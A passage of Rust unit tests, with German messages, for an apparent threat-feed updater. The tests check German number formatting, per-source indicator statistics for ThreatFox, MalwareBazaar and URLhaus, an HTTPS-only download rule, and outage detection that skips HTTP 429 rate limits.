    fn german_numbers_and_stats() {
        assert_eq!(fmt_num(0), "0");
        assert_eq!(fmt_num(999), "999");
        assert_eq!(fmt_num(1000), "1.000");
        assert_eq!(fmt_num(1172572), "1.172.572");
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let mut s = Sources::open_dir(dir.path().to_path_buf()).unwrap();
        let mut details = BTreeMap::new();
        details.insert("sha256".to_string(), 10);
        details.insert("url".to_string(), 5);
        details.insert("domain".to_string(), 2);
        s.status.insert("threatfox".into(), SourceStatus { last_update: Some("x".into()), entries: 17, details, ..Default::default() });
        s.status.insert("malwarebazaar".into(), SourceStatus { last_update: Some("x".into()), entries: 1000, ..Default::default() });
        s.status.insert("urlhaus".into(), SourceStatus { last_update: Some("x".into()), entries: 100, error: Some("kaputt".into()), ..Default::default() });
        let st = s.stats(&QuellenConfig::default());
        assert_eq!(st.schadsoftware_hashes, 1010);
        assert_eq!(st.schad_adressen, 107);
        assert_eq!(st.threatfox_iocs, 17);
        assert_eq!(st.quellen_ok, 2, "Quelle mit Fehler zaehlt nicht als OK");
        assert_eq!(st.quellen_aktiv, 11);
    }

    #[test]
    fn only_https() {
        assert!(download("http://example.com/", &[], 10).is_err());
    }
}

#[cfg(test)]
mod outage_tests {
    use super::*;

    fn at(s: &str) -> NaiveDateTime {
        NaiveDateTime::parse_from_str(s, TS).unwrap()
    }

    #[test]
    fn a_source_fails_after_three_attempts_or_three_days_but_never_for_a_rate_limit() {
        let now = at("2026-11-21 08:00:00");
        let ok = SourceStatus { last_update: Some("2026-11-21 07:00:00".into()), ..Default::default() };
        assert_eq!(outage(&ok, now), None);
        let once = SourceStatus { error: Some("HTTP 500".into()), failures: 1, ..ok.clone() };
        assert_eq!(outage(&once, now), None, "ein einzelner Fehlversuch ist noch keine Störung");
        let thrice = SourceStatus { failures: 3, ..once.clone() };
        assert_eq!(outage(&thrice, now).as_deref(), Some("3 Fehlversuche hintereinander, zuletzt: HTTP 500"));
        let old = SourceStatus { last_update: Some("2026-11-17 07:00:00".into()), ..once.clone() };
        assert_eq!(outage(&old, now).as_deref(), Some("der Stand ist 4 Tage alt, letzter Fehler: HTTP 500"));
        // The PC was off for a week: an old state without a failed attempt is no outage.
        let off = SourceStatus { last_update: Some("2026-11-10 07:00:00".into()), ..Default::default() };
        assert_eq!(outage(&off, now), None);
        let limit = SourceStatus { error: Some("abuse.ch: HTTP 429 zu viele Abrufe".into()), failures: 9, ..old.clone() };
        assert_eq!(outage(&limit, now), None, "zu viele Abrufe regelt sich von selbst");
        let never = SourceStatus { error: Some("kein Netz".into()), failures: 3, ..Default::default() };
        assert!(outage(&never, now).is_some(), "nie geladen und drei Fehlversuche");
    }

    #[test]
    fn a_new_outage_after_a_good_update_is_a_new_episode_and_the_core_lists_weigh_more() {
        let a = SourceStatus { last_update: Some("2026-11-20 07:00:00".into()), ..Default::default() };
        let b = SourceStatus { last_update: Some("2026-11-21 07:00:00".into()), ..Default::default() };
        assert_ne!(outage_episode(SourceId::UrlHaus, &a), outage_episode(SourceId::UrlHaus, &b));
        assert_eq!(outage_episode(SourceId::UrlHaus, &a), outage_episode(SourceId::UrlHaus, &a));
        assert_eq!(outage_severity(SourceId::MalwareBazaar), crate::model::Severity::Hoch);
        assert_eq!(outage_severity(SourceId::OpenPhish), crate::model::Severity::Mittel);
    }
}
